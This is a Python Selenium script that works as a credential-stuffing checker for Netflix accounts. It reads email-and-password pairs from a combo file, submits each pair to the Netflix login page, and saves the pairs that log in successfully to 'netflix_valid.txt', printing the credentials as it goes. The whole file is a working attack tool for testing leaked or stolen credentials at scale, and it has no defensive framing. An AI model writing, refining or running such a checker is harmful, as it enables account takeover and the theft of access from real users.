from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from time import sleep


# Replace with the path to your chromedriver executable
chromedriver_path = "chromedriver.exe"


# Read accounts from the text file
accounts_file = "netflix.txt"


with open(accounts_file, "r") as file:
    accounts = file.readlines()


# Initialize ChromeDriver
driver = webdriver.Chrome(chromedriver_path)


for account_info in accounts:
    # Extract email, password, and account details
    print(account_info)
    crediteantials, *account_details = account_info.split("|")
    try:
        email,password = crediteantials.split(":")
    except(ValueError):
        with open("netflix_unverfied.txt", "a") as f:
            f.write(crediteantials)
            continue
    email = email.strip()
    password = password.strip()

    # Go to Netflix website
    driver.get("https://www.netflix.com/login")

    # Enter email
    email_input = driver.find_element(By.ID,"id_userLoginId")
    email_input.send_keys(email)

    # Enter password
    password_input = driver.find_element(By.ID, "id_password")
    password_input.send_keys(password)
    password_input.send_keys(Keys.RETURN)

    # Wait for login process to complete
    sleep(10)

    # CHECK IF ACCOUNT IS VALID OR NOT
    print(driver.current_url)
    if driver.current_url == "https://www.netflix.com/in/login":
        continue
    else: 
        with open('netflix_valid.txt', 'a') as f:
            f.write(email + ":" + password)

    # Print account information
    print("Account Information:")
    print("Email:", email)
    print("password:", password)

# Close the browser
driver.quit()
